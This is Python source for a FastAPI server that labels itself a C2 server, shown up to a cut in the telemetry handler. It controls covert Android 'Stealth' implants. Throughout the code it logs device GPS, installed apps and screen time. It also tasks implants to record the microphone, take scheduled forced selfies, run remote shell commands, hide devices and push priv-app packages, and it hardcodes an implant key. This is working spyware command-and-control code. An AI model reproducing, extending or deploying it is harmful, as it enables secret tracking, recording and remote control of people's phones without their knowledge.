import asyncio
import hashlib
import json
import math
import os
import re
import secrets
import shutil
import sqlite3
import tempfile
import threading
import time
import zipfile
from contextlib import asynccontextmanager, suppress
from datetime import datetime, timedelta
from typing import Generator, Optional

from fastapi import (
    Body, Depends, FastAPI, File, Form, Header, HTTPException,
    Request, UploadFile, WebSocket, WebSocketDisconnect, status,
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import (
    FileResponse, HTMLResponse, JSONResponse, RedirectResponse, StreamingResponse,
)
from fastapi.staticfiles import StaticFiles


# ── Configuration ──────────────────────────────────────────────────────────────

SESSION_COOKIE_NAME = "session_token"
SESSION_DURATION    = 60 * 60 * 8  # 8 hours

BASE_DIR             = os.path.dirname(os.path.abspath(__file__))
DB_FILE              = os.path.join(BASE_DIR, "telemetry.db")
PROTECTED_MEDIA_ROOT = os.path.join(BASE_DIR, "protected_media")
AUDIO_DIR            = os.path.join(PROTECTED_MEDIA_ROOT, "audio")
SELFIE_DIR           = os.path.join(PROTECTED_MEDIA_ROOT, "selfies")
AUDIO_BLAST_DIR      = os.path.join(BASE_DIR, "audio_blast")
OTA_PACKAGE_DIR      = os.path.join(BASE_DIR, "ota_packages")

# component name → priv-app folder + primary APK filename on device
OTA_COMPONENT_MAP: dict[str, dict[str, str]] = {
    "StealthAlert":  {"package": "com.stealthalert",  "apk": "com.stealthalert.apk"},
    "StealthAudio":  {"package": "com.stealthaudio",  "apk": "com.stealthaudio.apk"},
    "StealthGps":    {"package": "com.stealthgps",    "apk": "com.stealthgps.apk"},
    "StealthMonitor": {"package": "com.stealthmonitor", "apk": "com.stealthmonitor.apk"},
    "StealthSelfie": {"package": "com.stealthselfie", "apk": "com.stealthselfie.apk"},
    "reporter":      {"package": "_reporter",         "apk": "reporter"},
}

ADMIN_USERNAME    = os.getenv("ADMIN_USERNAME", "admin")
# Default placeholder hash — override with ADMIN_HASH env var in production
ADMIN_PASSWORD_HASH = str(
    os.getenv("ADMIN_HASH")
    or "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4"
)
IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")

SERVER_VERSION = "v3.7-duchamp"

os.makedirs(AUDIO_BLAST_DIR, exist_ok=True)
os.makedirs(OTA_PACKAGE_DIR, exist_ok=True)

session_store: dict[str, float] = {}

# ── GPS deduplication cache ────────────────────────────────────────────────────
# Maps device_id → (lat, lon, unix_time) of the last point written to history.
# Recording interval follows device ping_interval (e.g. 5s). Between intervals,
# only record if displacement exceeds GPS_MIN_DISTANCE_M (reduces stationary drift).

GPS_MIN_DISTANCE_M: float = 8.0
GPS_DEFAULT_INTERVAL_S: float = 5.0
_gps_last_point: dict[str, tuple[float, float, float]] = {}

# ── Cleanup state ──────────────────────────────────────────────────────────────
LAST_CLEANUP     = 0
CLEANUP_INTERVAL = 86_400  # once per day
REQUEST_COUNTER  = 0


# ══════════════════════════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════════════════════════

def safe_token() -> str:
    return secrets.token_urlsafe(32)


def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def add_session(token: str) -> None:
    session_store[token] = time.time() + SESSION_DURATION


def validate_session_token(token: str) -> bool:
    if not token:
        return False
    expires = session_store.get(token)
    if not expires or expires < time.time():
        session_store.pop(token, None)
        return False
    session_store[token] = time.time() + SESSION_DURATION  # rolling expiry
    return True


def validate_device_id(device_id: str) -> bool:
    """Accept only alphanumeric, underscore, and dash; max 256 chars."""
    if not device_id or not isinstance(device_id, str):
        return False
    return len(device_id) <= 256 and re.match(r'^[a-zA-Z0-9_\-]+$', device_id) is not None


def sanitize_device_id(device_id: str) -> str:
    safe = "".join(c for c in device_id if c.isalnum() or c in ("-", "_")).strip()
    return safe or "unknown"


def validate_coordinates(lat: float, lon: float) -> bool:
    try:
        return -90 <= float(lat) <= 90 and -180 <= float(lon) <= 180
    except (ValueError, TypeError):
        return False


def to_int(value, default: int = 0) -> int:
    try:
        return int(value)
    except Exception:
        if isinstance(value, str):
            return 1 if value.lower() in ("true", "yes", "on") else 0
        return default


def haversine(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
    """Return distance in metres between two GPS coordinates."""
    R = 6_371_000.0
    d_lat = math.radians(lat2 - lat1)
    d_lon = math.radians(lon2 - lon1)
    a = (
        math.sin(d_lat / 2) ** 2
        + math.cos(math.radians(lat1))
        * math.cos(math.radians(lat2))
        * math.sin(d_lon / 2) ** 2
    )
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))


# ── GPS deduplication ──────────────────────────────────────────────────────────

def should_record_gps(
    device_id: str,
    lat: float,
    lon: float,
    now_unix: float,
    min_interval_s: Optional[float] = None,
) -> bool:
    interval = float(min_interval_s or GPS_DEFAULT_INTERVAL_S)
    if interval < 3.0:
        interval = 3.0
    last = _gps_last_point.get(device_id)
    if last is None:
        return True
    last_lat, last_lon, last_time = last
    elapsed = now_unix - last_time
    if elapsed >= interval:
        return True
    return haversine(last_lat, last_lon, lat, lon) > GPS_MIN_DISTANCE_M


def update_gps_cache(device_id: str, lat: float, lon: float, unix_time: float) -> None:
    _gps_last_point[device_id] = (lat, lon, unix_time)


# ── Scheduling helpers ─────────────────────────────────────────────────────────

def choose_default_selfie_datetime() -> datetime:
    now = datetime.now()
    if now.hour < 10:
        return now.replace(hour=10, minute=30, second=0, microsecond=0)
    if now.hour < 14:
        return now.replace(hour=14, minute=30, second=0, microsecond=0)
    if now.hour < 18:
        return now.replace(hour=18, minute=30, second=0, microsecond=0)
    return (now + timedelta(days=1)).replace(hour=10, minute=30, second=0, microsecond=0)


def parse_datetime_string(value: str) -> Optional[datetime]:
    if not value:
        return None
    try:
        return datetime.strptime(value, "%Y-%m-%d %H:%M")
    except Exception:
        return None


def format_datetime_string(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%d %H:%M")


def get_next_run_at_for_time_string(time_str: str) -> str:
    now = datetime.now()
    try:
        parsed   = datetime.strptime(time_str, "%H:%M")
        next_run = now.replace(hour=parsed.hour, minute=parsed.minute, second=0, microsecond=0)
    except Exception:
        next_run = choose_default_selfie_datetime()
    if next_run <= now:
        next_run += timedelta(days=1)
    return format_datetime_string(next_run)


# ══════════════════════════════════════════════════════════════════════════════
# Database
# ══════════════════════════════════════════════════════════════════════════════

def create_db_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("PRAGMA synchronous=NORMAL;")
    conn.execute("PRAGMA temp_store=MEMORY;")
    conn.execute("PRAGMA cache_size=-10000;")       # ~40 MB page cache
    conn.execute("PRAGMA mmap_size=134217728;")     # 128 MB memory-mapped I/O
    conn.execute("PRAGMA wal_autocheckpoint=1000;")
    return conn


def get_db() -> Generator[sqlite3.Connection, None, None]:
    conn = create_db_connection()
    try:
        yield conn
    finally:
        conn.close()


def _try_add_column(c: sqlite3.Cursor, stmt: str) -> None:
    """Silently ignore 'duplicate column' errors from ALTER TABLE."""
    try:
        c.execute(stmt)
    except sqlite3.OperationalError:
        pass


def init_db() -> None:
    """Create all tables, add any missing columns, and build indices."""
    conn = create_db_connection()
    c    = conn.cursor()

    c.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id            TEXT PRIMARY KEY,
            level                INTEGER,
            lat                  REAL,
            lon                  REAL,
            timestamp            TEXT,
            unix_time            REAL,
            ping_interval        INTEGER DEFAULT 5,
            record_audio         INTEGER DEFAULT 0,
            record_duration      INTEGER DEFAULT 30,
            notif_state          INTEGER DEFAULT 0,
            notif_text           TEXT    DEFAULT '',
            blocked_apps         TEXT    DEFAULT '',
            location_tracking    INTEGER DEFAULT 1,
            installed_apps       TEXT    DEFAULT '',
            screen_time_minutes  INTEGER DEFAULT 0,
            charging             INTEGER DEFAULT 0,
            last_shell_command   TEXT    DEFAULT '',
            last_shell_output    TEXT    DEFAULT '',
            last_shell_status    INTEGER DEFAULT 0,
            last_shell_at        REAL    DEFAULT 0
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS history (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            level     INTEGER,
            lat       REAL,
            lon       REAL,
            timestamp TEXT,
            unix_time REAL
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS daily_screen_time (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            date      TEXT,
            minutes   INTEGER DEFAULT 0,
            updated_at REAL,
            UNIQUE(device_id, date)
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS battery_history (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id   TEXT,
            level       INTEGER,
            timestamp   TEXT,
            unix_time   REAL,
            gap_seconds INTEGER DEFAULT 0
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS device_errors (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            source    TEXT,
            message   TEXT,
            timestamp TEXT,
            unix_time REAL
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS selfies (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id     TEXT,
            filename      TEXT,
            timestamp     TEXT,
            unix_time     REAL,
            battery       INTEGER DEFAULT 0,
            lat           REAL    DEFAULT 0,
            lon           REAL    DEFAULT 0,
            review_status TEXT    DEFAULT 'pending',
            reviewed_at   TEXT    DEFAULT NULL
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS selfie_skips (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            skip_date TEXT,
            timestamp TEXT,
            unix_time REAL,
            UNIQUE(device_id, skip_date)
        )
    """)

    c.execute("""
        CREATE TABLE IF NOT EXISTS selfie_schedule (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id  TEXT UNIQUE,
            next_run_at TEXT,
            enabled    INTEGER DEFAULT 1,
            dev_mode   INTEGER DEFAULT 1,
            created_at REAL,
            updated_at REAL
        )
    """)

    # Migrations — add columns that may be absent on older databases
    migrations = [
        "ALTER TABLE devices ADD COLUMN play_audio         INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN reboot_cmd         INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN shutdown_cmd       INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN screen_time_minutes INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN charging           INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN hidden             INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN audio_loops        INTEGER DEFAULT 0",
        "ALTER TABLE devices ADD COLUMN audio_playing      INTEGER DEFAULT 0",
        "ALTER TABLE selfies ADD COLUMN review_status      TEXT DEFAULT 'pending'",
        "ALTER TABLE selfies ADD COLUMN reviewed_at        TEXT DEFAULT NULL",
    ]
    for stmt in migrations:
        _try_add_column(c, stmt)

    # Composite indices — (device_id, unix_time DESC) covers both WHERE and ORDER BY
    c.execute("CREATE INDEX IF NOT EXISTS idx_history_device_unix     ON history(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_battery_device_unix     ON battery_history(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_errors_device_unix      ON device_errors(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_selfies_device_unix     ON selfies(device_id, unix_time DESC)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_screen_time_device_date ON daily_screen_time(device_id, date)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_selfie_schedule_device  ON selfie_schedule(device_id)")

    conn.commit()
    conn.close()


# Initialise schema before the app starts (covers non-lifespan startup paths)
init_db()


# ══════════════════════════════════════════════════════════════════════════════
# Cleanup
# ══════════════════════════════════════════════════════════════════════════════

def run_auto_cleanup(db: sqlite3.Connection) -> None:
    """
    Delete rows older than 7 days in small batches to avoid long exclusive-lock
    spikes that would block WebSocket writes.
    """
    global LAST_CLEANUP
    now = time.time()
    if now - LAST_CLEANUP < CLEANUP_INTERVAL:
        return
    LAST_CLEANUP = now

    cutoff = now - (7 * 86_400)
    c      = db.cursor()

    for table, col in [
        ("history",        "unix_time"),
        ("battery_history", "unix_time"),
        ("device_errors",  "unix_time"),
    ]:
        while True:
            c.execute(
                f"DELETE FROM {table} WHERE rowid IN "
                f"(SELECT rowid FROM {table} WHERE {col} < ? LIMIT 500)",
                (cutoff,),
            )
            db.commit()
            if c.rowcount < 500:
                break

    # Refresh query-planner stats and checkpoint WAL after bulk deletes
    with suppress(sqlite3.DatabaseError):
        db.execute("PRAGMA optimize;")
    db.execute("PRAGMA wal_checkpoint(PASSIVE);")
    with suppress(sqlite3.DatabaseError):
        db.execute("PRAGMA incremental_vacuum(200);")

    # Remove unflagged audio files older than 7 days
    if os.path.exists(AUDIO_DIR):
        for fname in os.listdir(AUDIO_DIR):
            if fname.endswith(".wav") and "_FLAG" not in fname:
                try:
                    ts = int(fname.split("_")[-1].split(".")[0])
                    if ts < cutoff:
                        os.remove(os.path.join(AUDIO_DIR, fname))
                except Exception:
                    pass


# ══════════════════════════════════════════════════════════════════════════════
# WebSocket connection manager
# ══════════════════════════════════════════════════════════════════════════════

class ConnectionManager:
    def __init__(self) -> None:
        self.active_connections: dict[str, WebSocket] = {}
        self.lock = asyncio.Lock()

    async def connect(self, websocket: WebSocket, client_id: str) -> None:
        await websocket.accept()
        async with self.lock:
            self.active_connections[client_id] = websocket

    async def disconnect(self, client_id: str) -> None:
        async with self.lock:
            self.active_connections.pop(client_id, None)

    async def send_task(self, client_id: str, task_dict: dict) -> bool:
        payload = {"implant_key": IMPLANT_KEY, **task_dict}
        async with self.lock:
            websocket = self.active_connections.get(client_id)
        if websocket is None:
            return False
        try:
            await websocket.send_text(json.dumps(payload))
            return True
        except Exception:
            await self.disconnect(client_id)
            return False


ws_manager: ConnectionManager = ConnectionManager()
pending_location_checks: dict[str, asyncio.Future] = {}


# ══════════════════════════════════════════════════════════════════════════════
# Server-Sent Events broadcaster
# ══════════════════════════════════════════════════════════════════════════════

class SSEBroadcaster:
    """Push events to all connected browser dashboard clients in real time."""

    def __init__(self) -> None:
        self._queues: list[asyncio.Queue] = []
        self._lock   = asyncio.Lock()

    async def subscribe(self) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue(maxsize=200)
        async with self._lock:
            self._queues.append(q)
        return q

    async def unsubscribe(self, q: asyncio.Queue) -> None:
        async with self._lock:
            with suppress(ValueError):
                self._queues.remove(q)

    async def broadcast(self, event_type: str, data: dict) -> None:
        """Fire-and-forget push to every subscribed browser tab."""
        msg = f"event: {event_type}\ndata: {json.dumps(data)}\n\n"
        async with self._lock:
            dead: list[asyncio.Queue] = []
            for q in self._queues:
                try:
                    q.put_nowait(msg)
                except asyncio.QueueFull:
                    dead.append(q)   # slow client — drop it
            for q in dead:
                with suppress(ValueError):
                    self._queues.remove(q)


sse: SSEBroadcaster = SSEBroadcaster()


# ══════════════════════════════════════════════════════════════════════════════
# Background tasks
# ══════════════════════════════════════════════════════════════════════════════

async def selfie_scheduler() -> None:
    """Fires scheduled selfie captures once per 30-second tick."""
    while True:
        try:
            db = create_db_connection()
            c  = db.cursor()
            c.execute("SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule")
            now   = datetime.now()
            today = now.strftime("%Y-%m-%d")

            for row in c.fetchall():
                if row["enabled"] != 1 or not row["next_run_at"]:
                    continue
                next_run = parse_datetime_string(row["next_run_at"])
                if not next_run or next_run > now:
                    continue

                # Skip if today is marked as a skip day
                c.execute(
                    "SELECT 1 FROM selfie_skips WHERE device_id = ? AND skip_date = ? LIMIT 1",
                    (row["device_id"], today),
                )
                if c.fetchone():
                    _advance_selfie_schedule(row["device_id"], db)
                    continue

                # Dev mode: advance schedule without sending command
                if row["dev_mode"] == 1:
                    _advance_selfie_schedule(row["device_id"], db)
                    continue

                if row["device_id"] in ws_manager.active_connections:
                    await ws_manager.send_task(row["device_id"], {"task": "force_selfie"})
                _advance_selfie_schedule(row["device_id"], db)

        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[scheduler] error: {e}", flush=True)
        finally:
            with suppress(Exception):
                db.close()

        await asyncio.sleep(30)


async def auto_cleanup_task() -> None:
    """Run database cleanup every 10 minutes to avoid DoS lockups."""
    while True:
        await asyncio.sleep(600)
        try:
            db = create_db_connection()
            run_auto_cleanup(db)
        except Exception as e:
            print(f"[cleanup] error: {e}", flush=True)
        finally:
            with suppress(Exception):
                db.close()


# ── Selfie schedule helpers ────────────────────────────────────────────────────

def ensure_selfie_schedule(device_id: str, db: sqlite3.Connection):
    c = db.cursor()
    c.execute(
        "SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule WHERE device_id = ?",
        (device_id,),
    )
    row = c.fetchone()
    if row:
        return row
    next_run  = choose_default_selfie_datetime()
    now_unix  = time.time()
    c.execute(
        "INSERT INTO selfie_schedule (device_id, next_run_at, enabled, dev_mode, created_at, updated_at)"
        " VALUES (?, ?, 1, 1, ?, ?)",
        (device_id, format_datetime_string(next_run), now_unix, now_unix),
    )
    db.commit()
    c.execute(
        "SELECT device_id, next_run_at, enabled, dev_mode FROM selfie_schedule WHERE device_id = ?",
        (device_id,),
    )
    return c.fetchone()


def _advance_selfie_schedule(device_id: str, db: sqlite3.Connection) -> None:
    c = db.cursor()
    c.execute("SELECT next_run_at FROM selfie_schedule WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if not row or not row["next_run_at"]:
        return
    current = parse_datetime_string(row["next_run_at"])
    if not current:
        return
    c.execute(
        "UPDATE selfie_schedule SET next_run_at = ?, updated_at = ? WHERE device_id = ?",
        (format_datetime_string(current + timedelta(days=1)), time.time(), device_id),
    )
    db.commit()


# ══════════════════════════════════════════════════════════════════════════════
# App lifecycle
# ══════════════════════════════════════════════════════════════════════════════

scheduler_task: Optional[asyncio.Task] = None
cleanup_task:   Optional[asyncio.Task] = None


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Ensure required directories exist
    for d in ("static", "templates", AUDIO_DIR, SELFIE_DIR):
        os.makedirs(d, exist_ok=True)

    init_db()

    # Seed the in-memory GPS cache from the last known point per device so a
    # server restart doesn't treat every device as "first point seen".
    try:
        seed_conn = create_db_connection()
        seed_c    = seed_conn.cursor()
        seed_c.execute(
            "SELECT device_id, lat, lon, unix_time FROM history"
            " GROUP BY device_id HAVING unix_time = MAX(unix_time)"
        )
        for row in seed_c.fetchall():
            _gps_last_point[row["device_id"]] = (row["lat"], row["lon"], row["unix_time"])
        seed_conn.close()
        print(f"[startup] GPS cache seeded for {len(_gps_last_point)} device(s)", flush=True)
    except Exception as e:
        print(f"[startup] GPS cache seed failed (non-fatal): {e}", flush=True)

    global scheduler_task, cleanup_task
    scheduler_task = asyncio.create_task(selfie_scheduler())
    cleanup_task   = asyncio.create_task(auto_cleanup_task())

    print(f"Anasio C2 Server {SERVER_VERSION} started", flush=True)
    try:
        yield
    finally:
        for task in (scheduler_task, cleanup_task):
            if task:
                task.cancel()
                with suppress(asyncio.CancelledError):
                    await task


# ══════════════════════════════════════════════════════════════════════════════
# FastAPI app
# ══════════════════════════════════════════════════════════════════════════════

app = FastAPI(lifespan=lifespan)

# FIX R3-8: CORS origins are now configurable via CORS_ORIGINS env var (comma-separated).
# Set CORS_ORIGINS="https://your-c2-domain.com" in production to enable session credentials.
# The wildcard default is kept for local/dev deployments where credentials don't matter.
_cors_origins     = [o.strip() for o in os.getenv("CORS_ORIGINS", "*").split(",") if o.strip()] or ["*"]
_cors_credentials = "*" not in _cors_origins  # wildcard + credentials is invalid per spec

app.add_middleware(
    CORSMiddleware,
    allow_origins=_cors_origins,
    allow_credentials=_cors_credentials,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/static",      StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
app.mount("/audio_blast", StaticFiles(directory=AUDIO_BLAST_DIR),                  name="audio_blast")


# ── Auth helpers ───────────────────────────────────────────────────────────────

def verify_session(request: Request) -> bool:
    token = request.cookies.get(SESSION_COOKIE_NAME)
    if not token or not validate_session_token(token):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unauthorized")
    return True


# ══════════════════════════════════════════════════════════════════════════════
# WebSocket endpoint
# ══════════════════════════════════════════════════════════════════════════════

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    await websocket.accept()
    client_id    = f"client_{id(websocket)}"
    db           = create_db_connection()
    pending_upload: dict | None = None  # metadata for the next binary frame
    # FIX H-3: track first sync with a per-connection flag to prevent the
    # is_new_connection check from firing a second time on the same WS object.
    already_synced = False

    try:
        while True:
            msg = await websocket.receive()

            # ── Binary frame: file upload data ──────────────────────────────
            if msg.get("type") == "websocket.receive" and msg.get("bytes") is not None:
                if pending_upload is not None:
                    try:
                        # FIX H-1: always use the authoritative client_id (resolved from the
                        # device's own device_id field) rather than pending_upload's fallback,
                        # which could diverge if metadata was set before client_id was resolved.
                        safe_dev = sanitize_device_id(client_id)
                        ext      = os.path.splitext(pending_upload.get("filepath", ""))[1] or ".m4a"
                        filename = f"{safe_dev}_{int(time.time())}{ext}"
                        dest     = os.path.join(AUDIO_DIR, filename)
                        with open(dest, "wb") as f:
                            f.write(msg["bytes"])
                        print(f"[upload] Saved {len(msg['bytes'])}B audio → {dest}", flush=True)
                        c = db.cursor()
                        c.execute(
                            "UPDATE devices SET record_audio = 0 WHERE device_id = ?",
                            (client_id,),
                        )
                        db.commit()
                    except Exception as e:
                        print(f"[upload] Failed to save binary upload: {e}", flush=True)
                    finally:
                        pending_upload = None
                else:
                    print(f"[ws] Unexpected binary frame ({len(msg['bytes'])}B) with no metadata", flush=True)
                continue

            # ── Text frame: JSON command/telemetry ──────────────────────────
            raw = msg.get("text")
            if raw is None:
                continue

            try:
                data = json.loads(raw)

                if not secrets.compare_digest(str(data.get("implant_key", "")), IMPLANT_KEY):
                    continue

                # Updater helper heartbeat (separate WS client from reporter)
                if data.get("updater_heartbeat"):
                    incoming_id = str(data.get("device_id", ""))
                    if not validate_device_id(incoming_id) or not incoming_id.startswith("updater_"):
                        continue
                    client_id = incoming_id
                    ws_manager.active_connections[client_id] = websocket
                    now_unix = time.time()
                    time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    c = db.cursor()
                    c.execute(
                        "INSERT INTO devices (device_id, timestamp, unix_time, hidden) VALUES (?, ?, ?, 1)"
                        " ON CONFLICT(device_id) DO UPDATE SET timestamp=?, unix_time=?",
                        (client_id, time_str, now_unix, time_str, now_unix),
                    )
                    if data.get("updater_result"):
                        c.execute(
                            "INSERT INTO device_errors (device_id, source, message, timestamp, unix_time)"
                            " VALUES (?, ?, ?, ?, ?)",
                            (client_id, "updater", str(data.get("updater_result")), time_str, now_unix),
                        )
                    db.commit()
                    continue

                # Upload metadata — binary payload follows in the next frame
                if "upload_type" in data:
                    pending_upload = {"device_id": client_id, **data}
                    print(f"[upload] Metadata from {client_id}: type={data.get('upload_type')}", flush=True)
                    continue

                # Shell command result — push to browser immediately.
                if "command_result" in data:
                    result_device = str(data.get("device_id", client_id))
                    if not validate_device_id(result_device):
                        continue
                    shell_output = data.get("command_result") or "[No output]"
                    c = db.cursor()
                    c.execute(
                        "UPDATE devices SET last_shell_output = ?, last_shell_status = 1,"
                        " last_shell_at = ? WHERE device_id = ?",
                        (shell_output, time.time(), result_device),
                    )
                    db.commit()
                    await sse.broadcast("shell_output", {
                        "device_id": result_device,
                        "output":    shell_output,
                        "at":        time.time(),
                    })
                    continue

                # IPC-forwarded events: Java companion apps write to reporter's
                # LocalSocket; reporter signs the JSON and relays it here so the
                # apps never need their own network connection or C2 credentials.
                if "event" in data:
                    ev     = str(data.get("event", ""))
                    ev_dev = str(data.get("device_id", client_id))
                    if ev and validate_device_id(ev_dev):
                        _c = db.cursor()
                        if ev == "audio_started":
                            try:
                                pt = int(data.get("play_audio") or 1)
                            except (TypeError, ValueError):
                                pt = 1
                            if pt not in (1, 2, 3): pt = 1
                            _c.execute(
                                "UPDATE devices SET audio_playing=1, play_audio=? WHERE device_id=?",
                                (pt, ev_dev))
                            db.commit()
                            await sse.broadcast("audio_started", {"device_id": ev_dev, "play_audio": pt})
                        elif ev == "audio_done":
                            _c.execute(
                                "UPDATE devices SET play_audio=0, audio_loops=0, audio_playing=0 WHERE device_id=?",
                                (ev_dev,))
                            db.commit()
                            await sse.broadcast("audio_done", {"device_id": ev_dev})
                        elif ev == "mic_record_started":
                            _c.execute("UPDATE devices SET record_audio=1 WHERE device_id=?", (ev_dev,))
                            db.commit()
                            await sse.broadcast("mic_record_started", {"device_id": ev_dev})
                        elif ev == "mic_record_done":
                            _c.execute("UPDATE devices SET record_audio=0 WHERE device_id=?", (ev_dev,))
                            db.commit()
                            await sse.broadcast("mic_record_done", {"device_id": ev_dev})
                        elif ev == "alert_shown":
                            _c.execute("UPDATE devices SET notif_state=1 WHERE device_id=?", (ev_dev,))
                            db.commit()
                            await sse.broadcast("alert_shown", {"device_id": ev_dev})
                        elif ev == "alert_dismissed":
                            _c.execute("UPDATE devices SET notif_state=0 WHERE device_id=?", (ev_dev,))
                            db.commit()
                            await sse.broadcast("alert_dismissed", {"device_id": ev_dev})
                        print(f"[ipc] {ev_dev} → {ev}", flush=True)
                    continue

                # Regular telemetry frame
                if "device_id" in data:
                    incoming_id = str(data["device_id"])
                    if not validate_device_id(incoming_id):
                        continue

                    client_id        = incoming_id
                    # FIX H-3: use per-connection already_synced flag so that the initial
                    # config push only fires once per physical WS connection, not on every
                    # telemetry heartbeat frame that arrives on the same connection.
                    # FIX R3-3: hold the connection lock for both the check and the insert so a
                    # rapid reconnect cannot race past this point and trigger a double config-sync.
                    async with ws_manager.lock:
                        is_new_connection = (not already_synced) and (client_id not in ws_manager.active_connections)
                        ws_manager.active_connections[client_id] = websocket
                        if is_new_connection:
                            already_synced = True

                    if is_new_connection:
                        await sse.broadcast("device_connected", {"device_id": client_id})

                    now_unix = time.time()
                    time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    c        = db.cursor()

                    c.execute(
                        "SELECT level, lat, lon, installed_apps, location_tracking,"
                        " screen_time_minutes, charging, ping_interval, hidden, blocked_apps"
                        " FROM devices WHERE device_id = ?",
                        (client_id,),
                    )
                    existing = c.fetchone()
                    exists   = existing is not None

                    # Sync server-side config to a newly (re-)connected device (reporter only)
                    if is_new_connection and exists and not client_id.startswith("updater_"):
                        print(
                            f"[ws] Initial sync → {client_id}: "
                            f"interval={existing['ping_interval']}, "
                            f"location={existing['location_tracking']}",
                            flush=True,
                        )
                        await ws_manager.send_task(client_id, {"task": "set_interval",  "interval": existing["ping_interval"]})
                        await ws_manager.send_task(client_id, {"task": "set_location",  "track":    existing["location_tracking"]})

                        c2 = db.cursor()
                        c2.execute(
                            "SELECT play_audio, audio_loops, audio_playing, record_audio, record_duration"
                            " FROM devices WHERE device_id = ?",
                            (client_id,),
                        )
                        audio_row = c2.fetchone()
                        if audio_row:
                            play_audio_value = int(audio_row["play_audio"] or 0)
                            audio_playing_value = int(audio_row["audio_playing"] or 0)
                            if play_audio_value in (1, 2, 3):
                                await ws_manager.send_task(client_id, {
                                    "task": "audio_blast",
                                    "play": str(play_audio_value),
                                    "loops": str(audio_row["audio_loops"] or 0),
                                })
                            elif audio_playing_value == 1:
                                await ws_manager.send_task(client_id, {"task": "audio_blast", "play": "0", "loops": "0"})
                            if audio_row["record_audio"] == 1:
                                await ws_manager.send_task(client_id, {
                                    "task": "mic_record",
                                    "duration": int(audio_row["record_duration"] or 30),
                                })

                        blocked = (existing["blocked_apps"] or "").strip()
                        if blocked:
                            await ws_manager.send_task(client_id, {"task": "update_blocked_apps", "apps": blocked})

                    # Error report from device
                    if "error_source" in data and "error_msg" in data:
                        c.execute(
                            "INSERT INTO device_errors (device_id, source, message, timestamp, unix_time)"
                            " VALUES (?, ?, ?, ?, ?)",
                            (client_id, data["error_source"], data["error_msg"], time_str, now_unix),
                        )
                        db.commit()
                        continue

                    # Parse telemetry values
                    apps         = data.get("installed_apps", existing["installed_apps"] if existing else "")
                    battery_val  = data.get("battery", existing["level"]            if existing else 0)
                    lat_val      = data.get("lat",     existing["lat"]              if existing else 0.0)
                    lon_val      = data.get("lon",     existing["lon"]              if existing else 0.0)
                    loc_state_val = data.get("loc_state", existing["location_tracking"] if existing else 1)

                    # Charging — accept int, bool, or digit string
                    if "charging" in data:
                        raw_charging = data["charging"]
                        if isinstance(raw_charging, bool):
                            charging_val = 1 if raw_charging else 0
                        elif isinstance(raw_charging, str) and raw_charging.isdigit():
                            charging_val = int(raw_charging)
                        else:
                            try:
                                charging_val = int(raw_charging)
                            except (TypeError, ValueError):
                                charging_val = existing["charging"] if existing else 0
                    else:
                        charging_val = existing["charging"] if existing else 0

                    # Screen time — support multiple field name variants
                    screen_time_minutes: Optional[int] = None
                    if "screen_time_minutes" in data:
                        screen_time_minutes = to_int(data["screen_time_minutes"])
                    elif "screen_time_hours" in data or "screen_time_mins" in data:
                        hours = to_int(data.get("screen_time_hours", 0))
                        mins  = to_int(data.get("screen_time_minutes", data.get("screen_time_mins", 0)))
                        screen_time_minutes = max(0, hours * 60 + mins)
                    elif isinstance(data.get("screen_time"), str):
                        parts = data["screen_time"].split(":")
                        try:
                            screen_time_minutes = (
                                int(parts[0]) * 60 + int(parts[1]) if len(parts) == 2
                                else int(parts[0])
                            )
                        except Exception:
                            screen_time_minutes = 0

                    current_screen_time = (
